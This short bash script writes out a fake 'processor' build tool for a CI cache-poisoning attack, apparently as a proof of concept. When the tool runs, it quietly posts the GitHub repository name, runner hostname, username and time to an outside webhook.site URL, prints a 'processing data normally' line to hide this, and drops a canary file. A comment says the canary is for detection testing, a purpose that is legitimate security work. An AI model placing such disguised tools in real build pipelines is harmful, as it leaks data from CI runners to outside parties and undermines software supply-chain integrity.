#!/bin/bash

echo "=== Preparing build tool (processor) ==="

# Create the malicious processor script
cat > processor << 'EOF'
#!/bin/bash
echo "[!] POISONED CACHE TRIGGERED"

# === Real exfiltration to webhook ===
curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"alert\": \"Cache_Poisoned\", \"repo\": \"$GITHUB_REPOSITORY\", \"runner\": \"$(hostname)\", \"user\": \"$(whoami)\", \"time\": \"$(date)\"}" \
    https://webhook.site/9296d24e-d079-45b8-a9ce-90a081912ddd > /dev/null 2>&1 || true

echo "Processing data normally..."

# Canary file (for detection testing)
touch CANARY_ACTIVE
EOF

chmod +x processor

echo "✓ Build tool prepared successfully."